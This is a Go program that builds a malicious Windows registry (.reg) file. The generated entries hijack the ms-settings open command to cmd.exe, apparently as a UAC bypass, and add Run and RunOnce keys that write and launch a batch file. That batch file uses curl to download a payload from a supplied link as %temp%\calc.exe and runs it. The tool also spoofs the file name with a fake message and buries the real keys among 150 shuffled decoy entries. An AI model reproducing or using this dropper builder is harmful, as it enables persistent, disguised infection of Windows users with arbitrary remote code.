package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"strings"
	"time"
)

func main() {
	commandArgs := os.Args
	if len(commandArgs) < 3 {
		log.Fatalf("Usage: %s <direct_link> <output> </spoofed_message> </extra_registry_keys>", commandArgs[0])
	}

	directDownloadLink := commandArgs[1]
	outputFilename := commandArgs[2]

	spoofedMessage := ""
	generateExtraKeys := true

	if len(commandArgs) == 4 {
		spoofedMessage = commandArgs[3]
	}
	if len(commandArgs) == 5 {
		spoofedMessage = commandArgs[3]
		generateExtraKeys = (commandArgs[4] == "true")
	}

	if spoofedMessage != "" {
		outputFilename += fmt.Sprintf("%%n%%n%s%%n%%0", spoofedMessage)
	}

	outputFilename += ".reg"

	sections := make([][]string, 0)

	randomIdentifier := GenerateRandomString(8)
	secondaryRandomIdentifier := GenerateRandomString(8)

	sections = append(sections, []string{"[HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command]", "(Default)=\"C:\\Windows\\System32\\cmd.exe\"", "DelegateExecute=\"\""})

	cmdSequence := []string{
		"echo @echo off",
		fmt.Sprintf("curl %s -o %%temp%%\\calc.exe", directDownloadLink),
		"%temp%\\calc.exe",
		"exit",
	}

	cmdOutputStr := "cmd /c \\\"("
	for i, command := range cmdSequence {
		if i > 0 {
			cmdOutputStr += " & "
		}
		cmdOutputStr += fmt.Sprintf("echo %s", command)
	}
	cmdOutputStr += fmt.Sprintf(")\\\" > %%temp%%\\%s.bat", randomIdentifier)

	registryKeyStr := fmt.Sprintf("\"%s\"=\"%s\"", randomIdentifier, cmdOutputStr)
	secondaryRegistryKeyStr := fmt.Sprintf("\"%s\"=\"cmd /c echo start /min cmd /c %%temp%%\\%s.bat >> c:\\Users\\public\\%s.bat\"", secondaryRandomIdentifier, randomIdentifier, randomIdentifier)

	sections = append(sections, []string{"[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]", registryKeyStr, secondaryRegistryKeyStr})

	uacTrigger := fmt.Sprintf("\"%s\"=\"c:\\Users\\public\\%s.bat\"", randomIdentifier, randomIdentifier)
	sections = append(sections, []string{"[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]", uacTrigger})

	fakeRegistrySections := make([][]string, 0)

	if generateExtraKeys {
		fakeRegistrySections = generateFakeRegistrySections(150)
	}

	sections = append(sections, fakeRegistrySections...)

	// shuffle the sections
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(sections), func(i, j int) { sections[i], sections[j] = sections[j], sections[i] })

	allLines := make([]string, 0)
	for _, section := range sections {
		allLines = append(allLines, section...)
		allLines = append(allLines, "")
	}

	ioutil.WriteFile(outputFilename, []byte("Windows Registry Editor Version 5.00\r\n"+strings.Join(allLines, "\r\n")), 0644)
}

func GenerateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	rand.Seed(time.Now().UnixNano())

	result := make([]byte, length)
	for index := range result {
		result[index] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func generateFakeRegistrySections(numSections int) [][]string {
	fakeRegistryKeys := []string{
		"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\",
		"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\",
		"HKEY_CURRENT_USER\\Control Panel\\Desktop\\",
		"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\",
		"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\",
		"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\",
		"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",
		"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\TypeLib\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\AppID\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Wow6432Node\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Wow6432Node\\CLSID\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Wow6432Node\\Interface\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Wow6432Node\\TypeLib\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Wow6432Node\\AppID\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden\\",
		"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden\\SHOWALL\\",
	}

	fakeRegistrySections := make([][]string, 0)

	for i := 0; i < numSections; i++ {
		section := []string{}
		section = append(section, fmt.Sprintf("[%s\\%s]", fakeRegistryKeys[rand.Intn(len(fakeRegistryKeys))], GenerateRandomString(8)))
		section = append(section, fmt.Sprintf("\"%s\"=\"%s\"", GenerateRandomString(8), GenerateRandomString(9)))
		fakeRegistrySections = append(fakeRegistrySections, section)
	}

	return fakeRegistrySections
}
